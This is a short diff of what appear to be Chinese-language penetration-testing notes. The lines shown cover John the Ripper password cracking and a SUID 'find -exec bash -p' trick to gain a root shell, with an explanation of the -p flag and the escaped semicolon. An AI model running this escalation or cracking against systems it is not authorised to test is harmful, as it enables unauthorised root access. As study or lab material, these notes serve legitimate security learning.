@@ -74,7 +74,7 @@ rm ~/.john/john.pot
 john --show <target>
 
 find提权 可以直接拿到管理员的bash
-find /etc/shadow -exec bash -p \; 
-/* 在以管理员SUID身份执行find时，运行bash并维持 -p 参数权限，以避免降级。
+find PATH -exec bash -p \; 
+/* 在以管理员SUID身份执行find时，运行bash并以参数 -p 维持root权限，以避免降级。
 语法规定在find ... -exec; 语句中，末尾必须加分号，但由于分号在shell中有特殊含义，
 需要反斜杠作用是告诉SHELL不要把分号解析成分隔符号。否则shell在解析后给find的输出中会因为解析成分隔符号而缺失给find。*/
